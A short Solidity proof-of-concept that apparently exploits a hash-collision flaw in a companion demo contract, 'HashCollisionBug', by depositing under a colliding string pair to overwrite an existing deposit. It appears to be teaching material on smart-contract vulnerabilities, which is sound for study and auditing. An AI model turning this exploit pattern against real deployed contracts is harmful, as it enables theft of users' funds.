// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Hash-collisions.sol";

contract MaliciousHashCollisionExploit {
    HashCollisionBug public immutable victimContract;

    constructor(address _victimContract) {
        victimContract = HashCollisionBug(_victimContract);
    }

    function exploitHashCollision(string memory _string1, string memory _string2, string memory _string1_2, string memory _string2_2) external payable {
        bytes32 hash1 = victimContract.createHash(_string1, _string2);
        bytes32 hash2 = victimContract.createHash(_string1_2, _string2_2);

        // Exploit the hash collision vulnerability
        require(hash1 == hash2, "Hash collision not detected");

        // Overwrite the existing deposit
        victimContract.deposit{value: msg.value}(_string1_2, _string2_2);
    }

    receive() external payable {}
}